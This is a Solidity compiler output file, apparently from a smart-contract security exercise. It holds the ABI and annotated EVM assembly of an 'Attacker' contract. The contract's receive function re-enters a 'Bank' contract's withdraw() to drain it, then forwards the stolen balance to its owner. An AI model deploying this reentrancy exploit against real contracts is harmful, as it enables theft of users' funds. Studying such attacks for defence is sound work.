{
	"contracts/reentrancyAttack_solution2-1.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_bank",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_owner",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "info",
							"type": "string"
						}
					],
					"name": "Info",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract Bank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "chekcBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "giveMeEther",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "sendEther",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawEther",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/reentrancyAttack_solution2-1.sol\":924:1812  contract Attacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1292:1394  constructor(address _bank, address _owner) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1357:1362  _bank */\n  dup2\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1345:1349  bank */\n  0x00\n  dup1\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1345:1363  bank = Bank(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1381:1387  _owner */\n  dup1\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1373:1378  owner */\n  0x01\n  0x00\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1373:1387  owner = _owner */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":1292:1394  constructor(address _bank, address _owner) {... */\n  pop\n  pop\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":924:1812  contract Attacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:596   */\ntag_3:\n  0x00\n  dup1\n    /* \"#utility.yul\":292:294   */\n  0x40\n    /* \"#utility.yul\":280:289   */\n  dup4\n    /* \"#utility.yul\":271:278   */\n  dup6\n    /* \"#utility.yul\":267:290   */\n  sub\n    /* \"#utility.yul\":263:295   */\n  slt\n    /* \"#utility.yul\":260:262   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":308:309   */\n  0x00\n    /* \"#utility.yul\":305:306   */\n  dup1\n    /* \"#utility.yul\":298:310   */\n  revert\n    /* \"#utility.yul\":260:262   */\ntag_13:\n    /* \"#utility.yul\":351:352   */\n  0x00\n    /* \"#utility.yul\":376:440   */\n  tag_14\n    /* \"#utility.yul\":432:439   */\n  dup6\n    /* \"#utility.yul\":423:429   */\n  dup3\n    /* \"#utility.yul\":412:421   */\n  dup7\n    /* \"#utility.yul\":408:430   */\n  add\n    /* \"#utility.yul\":376:440   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":366:440   */\n  swap3\n  pop\n    /* \"#utility.yul\":322:450   */\n  pop\n    /* \"#utility.yul\":489:491   */\n  0x20\n    /* \"#utility.yul\":515:579   */\n  tag_15\n    /* \"#utility.yul\":571:578   */\n  dup6\n    /* \"#utility.yul\":562:568   */\n  dup3\n    /* \"#utility.yul\":551:560   */\n  dup7\n    /* \"#utility.yul\":547:569   */\n  add\n    /* \"#utility.yul\":515:579   */\n  tag_8\n  jump\t// in\ntag_15:\n    /* \"#utility.yul\":505:579   */\n  swap2\n  pop\n    /* \"#utility.yul\":460:589   */\n  pop\n    /* \"#utility.yul\":250:596   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":602:698   */\ntag_16:\n  0x00\n    /* \"#utility.yul\":668:692   */\n  tag_18\n    /* \"#utility.yul\":686:691   */\n  dup3\n    /* \"#utility.yul\":668:692   */\n  tag_19\n  jump\t// in\ntag_18:\n    /* \"#utility.yul\":657:692   */\n  swap1\n  pop\n    /* \"#utility.yul\":647:698   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":704:830   */\ntag_19:\n  0x00\n    /* \"#utility.yul\":781:823   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":774:779   */\n  dup3\n    /* \"#utility.yul\":770:824   */\n  and\n    /* \"#utility.yul\":759:824   */\n  swap1\n  pop\n    /* \"#utility.yul\":749:830   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":836:958   */\ntag_11:\n    /* \"#utility.yul\":909:933   */\n  tag_22\n    /* \"#utility.yul\":927:932   */\n  dup2\n    /* \"#utility.yul\":909:933   */\n  tag_16\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":902:907   */\n  dup2\n    /* \"#utility.yul\":899:934   */\n  eq\n    /* \"#utility.yul\":889:891   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":948:949   */\n  0x00\n    /* \"#utility.yul\":945:946   */\n  dup1\n    /* \"#utility.yul\":938:950   */\n  revert\n    /* \"#utility.yul\":889:891   */\ntag_23:\n    /* \"#utility.yul\":879:958   */\n  pop\n  jump\t// out\n    /* \"contracts/reentrancyAttack_solution2-1.sol\":924:1812  contract Attacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":924:1812  contract Attacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0e29df22\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x300180e9\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x7362377b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x76cdb03b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xcd94f921\n      eq\n      tag_8\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1123:1124  0 */\n      0x00\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1103:1113  msg.sender */\n      caller\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1095:1122  address(msg.sender).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1095:1124  address(msg.sender).balance>0 */\n      gt\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1092:1280  if(address(msg.sender).balance>0) { // 해당 Bank Smart Contract 가 msg.sender... */\n      iszero\n      tag_11\n      jumpi\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1185:1189  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1185:1198  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1185:1200  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1092:1280  if(address(msg.sender).balance>0) { // 해당 Bank Smart Contract 가 msg.sender... */\n      jump(tag_15)\n    tag_11:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1234:1269  Info(\"Thank you for your ether :)\") */\n      0x6d128f203c67be3b2d9bf1612fd59bdd6ae01f4f0d2ffedd05e76ab2a09b7f8a\n      mload(0x40)\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1092:1280  if(address(msg.sender).balance>0) { // 해당 Bank Smart Contract 가 msg.sender... */\n    tag_15:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":924:1812  contract Attacker {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1400:1486  function sendEther() external payable {... */\n    tag_3:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1564:1661  function chekcBalance() external view returns(uint) {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1492:1558  function withdrawEther() external {... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      stop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":978:994  Bank public bank */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1000:1020  address public owner */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_33\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_33:\n      pop\n      tag_34\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      tag_36\n      swap2\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1667:1809  function giveMeEther() external {... */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_38\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_38:\n      pop\n      tag_39\n      tag_40\n      jump\t// in\n    tag_39:\n      stop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1400:1486  function sendEther() external payable {... */\n    tag_19:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1448:1452  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1448:1460  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1467:1476  msg.value */\n      callvalue\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1448:1479  bank.deposit{value:msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_42\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_42:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_44:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1400:1486  function sendEther() external payable {... */\n      jump\t// out\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1564:1661  function chekcBalance() external view returns(uint) {... */\n    tag_22:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1610:1614  uint */\n      0x00\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1633:1654  address(this).balance */\n      selfbalance\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1626:1654  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1564:1661  function chekcBalance() external view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1492:1558  function withdrawEther() external {... */\n    tag_27:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1536:1540  bank */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1536:1549  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1536:1551  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_47\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_47:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_49\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_49:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1492:1558  function withdrawEther() external {... */\n      jump\t// out\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":978:994  Bank public bank */\n    tag_30:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1000:1020  address public owner */\n    tag_35:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1667:1809  function giveMeEther() external {... */\n    tag_40:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1710:1721  bool result */\n      0x00\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1726:1731  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1726:1736  owner.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1743:1764  address(this).balance */\n      selfbalance\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1726:1769  owner.call{value:address(this).balance}(\"\") */\n      mload(0x40)\n      tag_51\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_55\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_54)\n    tag_55:\n      0x60\n      swap2\n      pop\n    tag_54:\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1709:1769  (bool result,) = owner.call{value:address(this).balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1787:1793  result */\n      dup1\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1779:1802  require(result,\"ERROR\") */\n      tag_56\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_57\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_56:\n        /* \"contracts/reentrancyAttack_solution2-1.sol\":1667:1809  function giveMeEther() external {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_60:\n        /* \"#utility.yul\":94:118   */\n      tag_62\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_63\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:284   */\n    tag_64:\n        /* \"#utility.yul\":229:277   */\n      tag_66\n        /* \"#utility.yul\":271:276   */\n      dup2\n        /* \"#utility.yul\":229:277   */\n      tag_67\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":224:227   */\n      dup3\n        /* \"#utility.yul\":217:278   */\n      mstore\n        /* \"#utility.yul\":207:284   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":290:603   */\n    tag_68:\n      0x00\n        /* \"#utility.yul\":453:520   */\n      tag_70\n        /* \"#utility.yul\":517:519   */\n      0x1b\n        /* \"#utility.yul\":512:515   */\n      dup4\n        /* \"#utility.yul\":453:520   */\n      tag_71\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":446:520   */\n      swap2\n      pop\n        /* \"#utility.yul\":546:575   */\n      0x5468616e6b20796f7520666f7220796f7572206574686572203a290000000000\n        /* \"#utility.yul\":542:543   */\n      0x00\n        /* \"#utility.yul\":537:540   */\n      dup4\n        /* \"#utility.yul\":533:544   */\n      add\n        /* \"#utility.yul\":526:576   */\n      mstore\n        /* \"#utility.yul\":598:600   */\n      0x20\n        /* \"#utility.yul\":593:596   */\n      dup3\n        /* \"#utility.yul\":589:601   */\n      add\n        /* \"#utility.yul\":582:601   */\n      swap1\n      pop\n        /* \"#utility.yul\":436:603   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":605:891   */\n    tag_72:\n      0x00\n        /* \"#utility.yul\":764:830   */\n      tag_74\n        /* \"#utility.yul\":828:829   */\n      0x05\n        /* \"#utility.yul\":823:826   */\n      dup4\n        /* \"#utility.yul\":764:830   */\n      tag_71\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":757:830   */\n      swap2\n      pop\n        /* \"#utility.yul\":856:863   */\n      0x4552524f52000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":852:853   */\n      0x00\n        /* \"#utility.yul\":847:850   */\n      dup4\n        /* \"#utility.yul\":843:854   */\n      add\n        /* \"#utility.yul\":836:864   */\n      mstore\n        /* \"#utility.yul\":886:888   */\n      0x20\n        /* \"#utility.yul\":881:884   */\n      dup3\n        /* \"#utility.yul\":877:889   */\n      add\n        /* \"#utility.yul\":870:889   */\n      swap1\n      pop\n        /* \"#utility.yul\":751:891   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":893:1178   */\n    tag_75:\n      0x00\n        /* \"#utility.yul\":1069:1152   */\n      tag_77\n        /* \"#utility.yul\":1150:1151   */\n      0x00\n        /* \"#utility.yul\":1145:1148   */\n      dup4\n        /* \"#utility.yul\":1069:1152   */\n      tag_78\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1062:1152   */\n      swap2\n      pop\n        /* \"#utility.yul\":1174:1175   */\n      0x00\n        /* \"#utility.yul\":1169:1172   */\n      dup3\n        /* \"#utility.yul\":1165:1176   */\n      add\n        /* \"#utility.yul\":1158:1176   */\n      swap1\n      pop\n        /* \"#utility.yul\":1056:1178   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1180:1290   */\n    tag_79:\n        /* \"#utility.yul\":1263:1287   */\n      tag_81\n        /* \"#utility.yul\":1281:1286   */\n      dup2\n        /* \"#utility.yul\":1263:1287   */\n      tag_82\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1258:1261   */\n      dup3\n        /* \"#utility.yul\":1251:1288   */\n      mstore\n        /* \"#utility.yul\":1245:1290   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1292:1659   */\n    tag_52:\n      0x00\n        /* \"#utility.yul\":1494:1641   */\n      tag_84\n        /* \"#utility.yul\":1637:1640   */\n      dup3\n        /* \"#utility.yul\":1494:1641   */\n      tag_75\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":1487:1641   */\n      swap2\n      pop\n        /* \"#utility.yul\":1654:1657   */\n      dup2\n        /* \"#utility.yul\":1647:1657   */\n      swap1\n      pop\n        /* \"#utility.yul\":1480:1659   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1661:1871   */\n    tag_37:\n      0x00\n        /* \"#utility.yul\":1788:1790   */\n      0x20\n        /* \"#utility.yul\":1777:1786   */\n      dup3\n        /* \"#utility.yul\":1773:1791   */\n      add\n        /* \"#utility.yul\":1765:1791   */\n      swap1\n      pop\n        /* \"#utility.yul\":1797:1868   */\n      tag_86\n        /* \"#utility.yul\":1865:1866   */\n      0x00\n        /* \"#utility.yul\":1854:1863   */\n      dup4\n        /* \"#utility.yul\":1850:1867   */\n      add\n        /* \"#utility.yul\":1841:1847   */\n      dup5\n        /* \"#utility.yul\":1797:1868   */\n      tag_60\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1759:1871   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1873:2105   */\n    tag_32:\n      0x00\n        /* \"#utility.yul\":2011:2013   */\n      0x20\n        /* \"#utility.yul\":2000:2009   */\n      dup3\n        /* \"#utility.yul\":1996:2014   */\n      add\n        /* \"#utility.yul\":1988:2014   */\n      swap1\n      pop\n        /* \"#utility.yul\":2020:2102   */\n      tag_88\n        /* \"#utility.yul\":2099:2100   */\n      0x00\n        /* \"#utility.yul\":2088:2097   */\n      dup4\n        /* \"#utility.yul\":2084:2101   */\n      add\n        /* \"#utility.yul\":2075:2081   */\n      dup5\n        /* \"#utility.yul\":2020:2102   */\n      tag_64\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":1982:2105   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2107:2510   */\n    tag_17:\n      0x00\n        /* \"#utility.yul\":2307:2309   */\n      0x20\n        /* \"#utility.yul\":2296:2305   */\n      dup3\n        /* \"#utility.yul\":2292:2310   */\n      add\n        /* \"#utility.yul\":2284:2310   */\n      swap1\n      pop\n        /* \"#utility.yul\":2352:2361   */\n      dup2\n        /* \"#utility.yul\":2346:2350   */\n      dup2\n        /* \"#utility.yul\":2342:2362   */\n      sub\n        /* \"#utility.yul\":2338:2339   */\n      0x00\n        /* \"#utility.yul\":2327:2336   */\n      dup4\n        /* \"#utility.yul\":2323:2340   */\n      add\n        /* \"#utility.yul\":2316:2363   */\n      mstore\n        /* \"#utility.yul\":2376:2507   */\n      tag_90\n        /* \"#utility.yul\":2502:2506   */\n      dup2\n        /* \"#utility.yul\":2376:2507   */\n      tag_68\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2368:2507   */\n      swap1\n      pop\n        /* \"#utility.yul\":2278:2510   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2512:2915   */\n    tag_58:\n      0x00\n        /* \"#utility.yul\":2712:2714   */\n      0x20\n        /* \"#utility.yul\":2701:2710   */\n      dup3\n        /* \"#utility.yul\":2697:2715   */\n      add\n        /* \"#utility.yul\":2689:2715   */\n      swap1\n      pop\n        /* \"#utility.yul\":2757:2766   */\n      dup2\n        /* \"#utility.yul\":2751:2755   */\n      dup2\n        /* \"#utility.yul\":2747:2767   */\n      sub\n        /* \"#utility.yul\":2743:2744   */\n      0x00\n        /* \"#utility.yul\":2732:2741   */\n      dup4\n        /* \"#utility.yul\":2728:2745   */\n      add\n        /* \"#utility.yul\":2721:2768   */\n      mstore\n        /* \"#utility.yul\":2781:2912   */\n      tag_92\n        /* \"#utility.yul\":2907:2911   */\n      dup2\n        /* \"#utility.yul\":2781:2912   */\n      tag_72\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2773:2912   */\n      swap1\n      pop\n        /* \"#utility.yul\":2683:2915   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2917:3127   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":3044:3046   */\n      0x20\n        /* \"#utility.yul\":3033:3042   */\n      dup3\n        /* \"#utility.yul\":3029:3047   */\n      add\n        /* \"#utility.yul\":3021:3047   */\n      swap1\n      pop\n        /* \"#utility.yul\":3053:3124   */\n      tag_94\n        /* \"#utility.yul\":3121:3122   */\n      0x00\n        /* \"#utility.yul\":3110:3119   */\n      dup4\n        /* \"#utility.yul\":3106:3123   */\n      add\n        /* \"#utility.yul\":3097:3103   */\n      dup5\n        /* \"#utility.yul\":3053:3124   */\n      tag_79\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":3015:3127   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3129:3268   */\n    tag_78:\n      0x00\n        /* \"#utility.yul\":3263:3266   */\n      dup2\n        /* \"#utility.yul\":3248:3266   */\n      swap1\n      pop\n        /* \"#utility.yul\":3242:3268   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3270:3427   */\n    tag_71:\n      0x00\n        /* \"#utility.yul\":3384:3390   */\n      dup3\n        /* \"#utility.yul\":3379:3382   */\n      dup3\n        /* \"#utility.yul\":3372:3391   */\n      mstore\n        /* \"#utility.yul\":3420:3424   */\n      0x20\n        /* \"#utility.yul\":3415:3418   */\n      dup3\n        /* \"#utility.yul\":3411:3425   */\n      add\n        /* \"#utility.yul\":3396:3425   */\n      swap1\n      pop\n        /* \"#utility.yul\":3366:3427   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3429:3517   */\n    tag_63:\n      0x00\n        /* \"#utility.yul\":3491:3515   */\n      tag_98\n        /* \"#utility.yul\":3509:3514   */\n      dup3\n        /* \"#utility.yul\":3491:3515   */\n      tag_99\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":3480:3515   */\n      swap1\n      pop\n        /* \"#utility.yul\":3474:3517   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3519:3637   */\n    tag_99:\n      0x00\n        /* \"#utility.yul\":3592:3634   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3585:3590   */\n      dup3\n        /* \"#utility.yul\":3581:3635   */\n      and\n        /* \"#utility.yul\":3570:3635   */\n      swap1\n      pop\n        /* 